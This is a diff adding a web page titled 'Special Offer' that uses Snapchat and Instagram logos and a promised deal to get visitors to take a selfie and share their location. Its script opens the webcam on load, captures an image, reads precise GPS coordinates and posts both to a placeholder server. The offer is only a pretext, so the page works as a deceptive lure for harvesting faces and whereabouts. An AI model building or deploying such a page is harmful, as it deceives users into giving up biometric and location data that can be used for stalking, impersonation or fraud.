@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Special Offer</title>
+  <style>
+    body {
+      background-color: skyblue;
+      font-family: sans-serif;
+      text-align: center;
+      padding: 20px;
+    }
+    .logos img {
+      width: 100px;
+      margin: 10px;
+    }
+    video, canvas {
+      display: block;
+      margin: 10px auto;
+      max-width: 90%;
+    }
+    button {
+      padding: 10px 20px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+  <h1>Get Exclusive Offers!</h1>
+  <p>Take a selfie and share your location to claim the deal!</p>
+
+  <div class="logos">
+    <img src="https://upload.wikimedia.org/wikipedia/en/a/ad/Snapchat_logo.svg" alt="Snapchat Logo">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo">
+  </div>
+
+  <video id="video" autoplay playsinline></video>
+  <canvas id="canvas" style="display: none;"></canvas>
+  <button onclick="captureAndSend()">Take Selfie & Share Location</button>
+
+  <script>
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const context = canvas.getContext('2d');
+
+    // Start webcam stream
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(stream => {
+        video.srcObject = stream;
+      })
+      .catch(err => {
+        alert("Camera access is needed for this offer.");
+        console.error(err);
+      });
+
+    function captureAndSend() {
+      if (!video.videoWidth || !video.videoHeight) {
+        alert("Video not ready yet. Please wait a moment and try again.");
+        return;
+      }
+
+      // Capture selfie from video
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      context.drawImage(video, 0, 0);
+
+      const selfieData = canvas.toDataURL('image/png');
+
+      // Get location
+      if (!navigator.geolocation) {
+        alert("Geolocation is not supported by your browser.");
+        return;
+      }
+
+      navigator.geolocation.getCurrentPosition(position => {
+        const data = {
+          image: selfieData,
+          location: {
+            lat: position.coords.latitude,
+            lon: position.coords.longitude
+          }
+        };
+
+        // Send data to your backend
+        fetch('https://your-server.com/submit', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(data)
+        })
+        .then(response => {
+          if (response.ok) {
+            alert("Thanks! Your selfie and location have been submitted.");
+          } else {
+            alert("Failed to send data. Please try again later.");
+          }
+        })
+        .catch(err => {
+          console.error(err);
+          alert("Network error: could not send data.");
+        });
+
+      }, (error) => {
+        alert("Location permission denied or unavailable.");
+        console.error(error);
+      });
+    }
+  </script>
+</body>
+</html>
